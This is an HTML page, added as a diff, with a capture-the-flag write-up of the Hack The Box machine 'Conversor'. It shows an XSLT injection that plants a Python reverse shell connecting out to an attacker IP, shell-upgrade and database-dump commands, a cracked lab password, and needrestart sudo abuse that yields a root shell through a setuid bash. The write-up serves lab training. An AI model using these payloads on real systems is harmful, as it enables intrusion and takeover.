@@ -1,0 +1,471 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Conversor &mdash; HTB Writeup</title>
+<style>
+  :root {
+    --bg: #f7f7f9;
+    --fg: #1d1d1f;
+    --muted: #5a5a5f;
+    --card: #ffffff;
+    --border: #e2e2e6;
+    --code-bg: #f0f0f3;
+    --accent: #7c3aed;
+    --link: #5b21b6;
+  }
+  @media (prefers-color-scheme: dark) {
+    :root {
+      --bg: #121214;
+      --fg: #eaeaec;
+      --muted: #a0a0a6;
+      --card: #1b1b1e;
+      --border: #2d2d31;
+      --code-bg: #0f0f11;
+      --accent: #a78bfa;
+      --link: #c4b5fd;
+    }
+  }
+  * { box-sizing: border-box; }
+  body {
+    margin: 0;
+    background: var(--bg);
+    color: var(--fg);
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    line-height: 1.65;
+  }
+  .wrap {
+    max-width: 760px;
+    margin: 0 auto;
+    padding: 2rem 1.25rem 4rem;
+  }
+  header.page-header {
+    display: flex;
+    align-items: center;
+    gap: 1.25rem;
+    border-bottom: 1px solid var(--border);
+    padding-bottom: 1.5rem;
+    margin-bottom: 1.5rem;
+    flex-wrap: wrap;
+  }
+  header.page-header img.machine-icon {
+    width: 96px;
+    height: 96px;
+    border-radius: 50%;
+    flex-shrink: 0;
+  }
+  header.page-header .meta h1 {
+    margin: 0 0 0.35rem;
+    font-size: 1.9rem;
+  }
+  header.page-header .meta .tags {
+    display: flex;
+    gap: 0.5rem;
+    flex-wrap: wrap;
+    margin-top: 0.5rem;
+  }
+  .badge {
+    display: inline-block;
+    font-size: 0.78rem;
+    padding: 0.2rem 0.6rem;
+    border-radius: 999px;
+    background: var(--code-bg);
+    border: 1px solid var(--border);
+    color: var(--muted);
+  }
+  .badge.difficulty-easy { color: #2e7d32; border-color: #2e7d3255; }
+  @media (prefers-color-scheme: dark) {
+    .badge.difficulty-easy { color: #81c995; }
+  }
+  nav.toc {
+    background: var(--card);
+    border: 1px solid var(--border);
+    border-radius: 10px;
+    padding: 1rem 1.25rem;
+    margin-bottom: 2rem;
+  }
+  nav.toc h2 {
+    margin-top: 0;
+    font-size: 1rem;
+    text-transform: uppercase;
+    letter-spacing: 0.04em;
+    color: var(--muted);
+  }
+  nav.toc ul {
+    margin: 0;
+    padding-left: 1.1rem;
+  }
+  nav.toc li { margin: 0.25rem 0; }
+  nav.toc a { color: var(--link); text-decoration: none; }
+  nav.toc a:hover { text-decoration: underline; }
+  h1, h2, h3 { line-height: 1.3; }
+  h2 {
+    margin-top: 2.5rem;
+    border-bottom: 1px solid var(--border);
+    padding-bottom: 0.3rem;
+  }
+  a { color: var(--link); }
+  p { margin: 1rem 0; }
+  code {
+    font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
+    background: var(--code-bg);
+    padding: 0.15rem 0.4rem;
+    border-radius: 5px;
+    font-size: 0.9em;
+  }
+  pre {
+    background: var(--code-bg);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    padding: 1rem;
+    overflow-x: auto;
+  }
+  pre code {
+    background: none;
+    padding: 0;
+    font-size: 0.88rem;
+  }
+  img {
+    max-width: 100%;
+    height: auto;
+    border-radius: 8px;
+    border: 1px solid var(--border);
+    display: block;
+    margin: 1.25rem 0;
+  }
+  figure {
+    margin: 1.5rem 0;
+  }
+  figcaption {
+    font-size: 0.85rem;
+    color: var(--muted);
+    text-align: center;
+    margin-top: 0.4rem;
+  }
+  blockquote.callout {
+    border-left: 4px solid var(--accent);
+    background: var(--card);
+    border-radius: 0 8px 8px 0;
+    padding: 0.75rem 1rem;
+    margin: 1.25rem 0;
+  }
+  blockquote.callout .callout-title {
+    font-weight: 600;
+    margin-bottom: 0.3rem;
+  }
+  table {
+    width: 100%;
+    border-collapse: collapse;
+    margin: 1.25rem 0;
+  }
+  th, td {
+    border: 1px solid var(--border);
+    padding: 0.5rem 0.75rem;
+    text-align: left;
+  }
+  th { background: var(--code-bg); }
+  footer {
+    margin-top: 3rem;
+    padding-top: 1rem;
+    border-top: 1px solid var(--border);
+    color: var(--muted);
+    font-size: 0.85rem;
+  }
+
+  :root { --user: #2563eb; --pass: #dc2626; }
+  @media (prefers-color-scheme: dark) {
+    :root { --user: #60a5fa; --pass: #f87171; }
+  }
+  /* Inline commands, paths and filenames: terminal look */
+  code {
+    display: inline;
+    background: #0b0f0b;
+    color: #39ff14;
+    border: 1px solid #1f2a1f;
+    border-radius: 5px;
+    padding: 0.1rem 0.4rem;
+    font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
+    font-size: 0.88em;
+    word-break: break-word;
+  }
+  /* Commands and replies: terminal box with a Copy button */
+  .terminal-box {
+    background: #000;
+    color: #39ff14;
+    border: 1px solid #1f2a1f;
+    border-radius: 8px;
+    padding: 0.9rem 1rem;
+    font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
+    font-size: 0.88rem;
+    white-space: pre-wrap;
+    word-break: break-all;
+    overflow-wrap: break-word;
+  }
+  .terminal-wrapper { margin: 1.25rem 0; }
+  .terminal-header { display: flex; justify-content: flex-end; padding-bottom: 6px; }
+  .copy-btn {
+    font-size: 11px;
+    padding: 4px 10px;
+    border-radius: 4px;
+    cursor: pointer;
+    background: var(--code-bg);
+    border: 1px solid var(--border);
+    color: var(--link);
+  }
+  .copy-btn:hover { background: var(--accent); color: var(--bg); }
+  /* Credentials and flags: labelled boxes */
+  fieldset.cred-box, fieldset.flag-box {
+    border: 1px solid var(--border);
+    border-left: 4px solid var(--accent);
+    border-radius: 8px;
+    padding: 0.6rem 1rem 0.9rem;
+    margin: 1.25rem 0;
+    background: var(--card);
+  }
+  fieldset legend {
+    padding: 0 0.4rem;
+    font-size: 0.8rem;
+    font-weight: 600;
+    letter-spacing: 0.04em;
+    text-transform: uppercase;
+    color: var(--accent);
+  }
+  fieldset.flag-box {
+    background: #000;
+    border-color: #1f2a1f;
+    border-left: 4px solid #39ff14;
+    color: #39ff14;
+  }
+  fieldset.flag-box legend { color: #39ff14; }
+  fieldset.flag-box code { background: none; border: none; padding: 0; color: inherit; }
+  /* Usernames and passwords */
+  .user { color: var(--user); font-weight: 600; }
+  .pass { color: var(--pass); font-weight: 600; }
+  code .user { color: #60a5fa; }
+  code .pass { color: #f87171; }
+</style>
+</head>
+<body>
+<div class="wrap">
+
+<header class="page-header">
+  <img class="machine-icon" src="/pngs/HTB/easy/Conversor/a02c6f24-5b8e-4e41-919e-40464d7c1a18.png" alt="Conversor machine icon from Hack The Box" loading="lazy">
+  <div class="meta">
+    <h1>Conversor</h1>
+    <div class="tags">
+      <span class="badge">Hack The Box</span>
+      <span class="badge">Linux</span>
+      <span class="badge difficulty-easy">Easy</span>
+      <span class="badge">XML/XSLT</span>
+      <span class="badge">needrestart 3.7</span>
+    </div>
+  </div>
+</header>
+
+<nav class="toc">
+  <h2>Contents</h2>
+  <ul>
+    <li><a href="#enumeration">Enumeration</a></li>
+    <li><a href="#foothold">Foothold</a></li>
+    <li><a href="#user">User Access</a></li>
+    <li><a href="#privesc">Privilege Escalation</a></li>
+  </ul>
+</nav>
+
+<blockquote class="callout">
+  <div class="callout-title">Key takeaways</div>
+  <ul>
+    <li><strong>XML-to-XSLT converter</strong></li>
+    <li><strong>Crafting a Python script inside an XML file for RCE</strong> &rarr; <strong>EXSLT <code>document()</code> write to the cron-executed scripts folder as <code>www-data</code></strong></li>
+    <li><strong><code>needrestart</code> 3.7 exploit for root</strong> &rarr; <strong>abuse Perl <code>system()</code> call in a crafted <code>.conf</code> file via sudo rights</strong></li>
+  </ul>
+</blockquote>
+
+<h2 id="enumeration">Enumeration</h2>
+<p>We start with casual enumeration and find that ports <code>22</code> and <code>80</code> are open.</p>
+
+<div class="terminal-wrapper">
+  <div class="terminal-header"><button class="copy-btn">Copy</button></div>
+  <div class="terminal-box">sudo nmap -p- --open -sS --min-rate 5000 -Pn -n -vvv 10.10.11.92</div>
+</div>
+
+<p>After this, we register a new account to log in to the web server.</p>
+
+<p>We can see that it converts XML and XSLT files.</p>
+<figure>
+  <img src="/pngs/HTB/easy/Conversor/Pasted image 20251212160857.png" alt="XML-to-XSLT conversion page on the web application" loading="lazy">
+</figure>
+
+<p>We can find and download an XSLT template.</p>
+
+<p>We can navigate to <code>/about</code> and then download the source code too.</p>
+
+<p>If we read <code>app.py</code> inside the <code>source</code> folder, we can see some important information, like where <code>users.db</code> is and that the database uses <code>sqlite3</code>.</p>
+
+<figure>
+  <img src="/pngs/HTB/easy/Conversor/Pasted image 20251212162337.png" alt="app.py source code showing the users.db location and sqlite3 usage" loading="lazy">
+</figure>
+
+<h2 id="foothold">Foothold</h2>
+<p>The next important piece of information is in <code>install.md</code>. The last line of this file says this:</p>
+
+<div class="terminal-wrapper">
+  <div class="terminal-header"><button class="copy-btn">Copy</button></div>
+  <div class="terminal-box">* * * * * www-data for f in /var/www/conversor.htb/scripts/*.py; do python3 "$f"; done</div>
+</div>
+
+<p>This means that every minute, any <code>.py</code> file inside the <code>/var/www/conversor.htb/scripts/</code> folder is executed by <code>www-data</code>. So we need to find a way to write a <code>.py</code> file inside the <code>/scripts</code> folder to get it executed and gain RCE.</p>
+
+<p>First, we create a legitimate nmap <code>.xml</code> file so we can upload it.</p>
+
+<div class="terminal-wrapper">
+  <div class="terminal-header"><button class="copy-btn">Copy</button></div>
+  <div class="terminal-box">nmap -p 22,80 -sC -sV -oA conv 10.10.11.92</div>
+</div>
+
+<p>Then we upload the default <code>.xslt</code> template that is provided to us, just to check how it functions and to check the traffic through Burp.</p>
+<figure>
+  <img src="/pngs/HTB/easy/Conversor/Pasted image 20251212164958.png" alt="Burp Suite traffic showing the default XSLT template upload" loading="lazy">
+</figure>
+
+<p>We can see that the file is uploaded. Now we want to upload a new one, and by uploading it, we create the malicious <code>.py</code> file at the same time.</p>
+
+<div class="terminal-wrapper">
+  <div class="terminal-header"><button class="copy-btn">Copy</button></div>
+  <div class="terminal-box">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;xsl:stylesheet
+ xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
+ xmlns:exploit="http://exslt.org/common"
+ extension-element-prefixes="exploit"
+ version="1.0"&gt;
+  &lt;xsl:template match="/"&gt;
+    &lt;exploit:document href="/var/www/conversor.htb/scripts/shell.py" method="text"&gt;
+import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.15.19",1111));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")
+    &lt;/exploit:document&gt;
+  &lt;/xsl:template&gt;
+&lt;/xsl:stylesheet&gt;</div>
+</div>
+
+<p>Before we upload the proper Python script, we open our listener. Then we can upload and click the <code>.html</code> file that was created. We wait for a minute and we can see that we got the shell.</p>
+<figure>
+  <img src="/pngs/HTB/easy/Conversor/Pasted image 20251212170426.png" alt="Reverse shell received on the listener after the scheduled script ran" loading="lazy">
+</figure>
+
+<h2 id="user">User Access</h2>
+<p>We upgrade the shell.</p>
+
+<div class="terminal-wrapper">
+  <div class="terminal-header"><button class="copy-btn">Copy</button></div>
+  <div class="terminal-box">python3 -c 'import pty; pty.spawn("/bin/bash")
+
+#Press Ctrl + Z
+
+stty raw -echo ; fg
+
+reset
+
+screen
+
+export TERM=xterm
+
+export SHELL=bash
+
+stty rows 40 columns 100</div>
+</div>
+
+<p>We know that the database is at the <code>/conversor/instance</code> directory and that it uses <code>sqlite3</code>, so we search for the users.</p>
+
+<div class="terminal-wrapper">
+  <div class="terminal-header"><button class="copy-btn">Copy</button></div>
+  <div class="terminal-box">cd instance
+sqlite3 ./users.db "SELECT * FROM users;"</div>
+</div>
+
+<figure>
+  <img src="/pngs/HTB/easy/Conversor/Pasted image 20251212170734.png" alt="sqlite3 query output listing the application's users" loading="lazy">
+</figure>
+
+<p>Because it is live, we can see other users who created new accounts.</p>
+
+<p>With CrackStation, I found the password for the <span class="user">fismathack</span> user.</p>
+
+<fieldset class="cred-box">
+  <legend>Credentials</legend>
+  <code><span class="user">fismathack</span> : <span class="pass">Keepmesafeandwarm</span></code>
+</fieldset>
+
+<p>We connect with SSH and get the user's flag.</p>
+
+<fieldset class="flag-box">
+  <legend>User Flag</legend>
+  <code>[REDACTED]</code>
+</fieldset>
+
+<h2 id="privesc">Privilege Escalation</h2>
+<p>After connecting to the server with SSH, I can see that running <code>sudo -l</code> gives this response.</p>
+
+<div class="terminal-wrapper">
+  <div class="terminal-header"><button class="copy-btn">Copy</button></div>
+  <div class="terminal-box">  (ALL : ALL) NOPASSWD: /usr/sbin/needrestart</div>
+</div>
+
+<p>If we check the version of <code>needrestart</code>, we can see it is <code>3.7</code>.</p>
+
+<p>There is also a write-up that explains how to use this vulnerability for privilege escalation.</p>
+
+<div class="terminal-wrapper">
+  <div class="terminal-header"><button class="copy-btn">Copy</button></div>
+  <div class="terminal-box">https://medium.com/@aniketdas07770/abusing-sudo-rights-on-needrestart-for-escalation-d1307c2af12f</div>
+</div>
+
+<p>We create a new <code>.conf</code> file. Because we have sudo privileges, we can copy the <code>/bin/bash</code> file (executed by root) to the <code>/tmp</code> directory and set it executable for any user.</p>
+
+<div class="terminal-wrapper">
+  <div class="terminal-header"><button class="copy-btn">Copy</button></div>
+  <div class="terminal-box">system("cp /bin/bash /tmp/; chmod u+s /tmp/bash")</div>
+</div>
+
+<p>Then we execute it.</p>
+
+<div class="terminal-wrapper">
+  <div class="terminal-header"><button class="copy-btn">Copy</button></div>
+  <div class="terminal-box">sudo needrestart -c cmd.conf</div>
+</div>
+
+<p>We can see that <code>bash</code> is copied to our <code>/tmp</code> directory. We can open a root session with this:</p>
+
+<div class="terminal-wrapper">
+  <div class="terminal-header"><button class="copy-btn">Copy</button></div>
+  <div class="terminal-box">./bash -p</div>
+</div>
+
+<p>Here we get the root flag.</p>
+
+<fieldset class="flag-box">
+  <legend>Root Flag</legend>
+  <code>[REDACTED]</code>
+</fieldset>
+
+<p>This is a different <code>.conf</code> file to get privilege escalation.</p>
+
+<div class="terminal-wrapper">
+  <div class="terminal-header"><button class="copy-btn">Copy</button></div>
+  <div class="terminal-box">cat > /tmp/exploit.conf << 'EOF'
+BEGIN { system("/bin/sh") }
+[needrestart]
+EOF</div>
+</div>
+
+<p>After creating it, we use this command again:</p>
+
+<div class="terminal-wrapper">
+  <div class="terminal-header"><button class="copy-btn">Copy</button></div>
+  <div class="terminal-box">sudo needrestart -c exploit.conf</div>
+</div>
+
+</div>
+<script src="/copy.js"></script>
+<script src="/nav.js"></script>
+</body>
+</html>
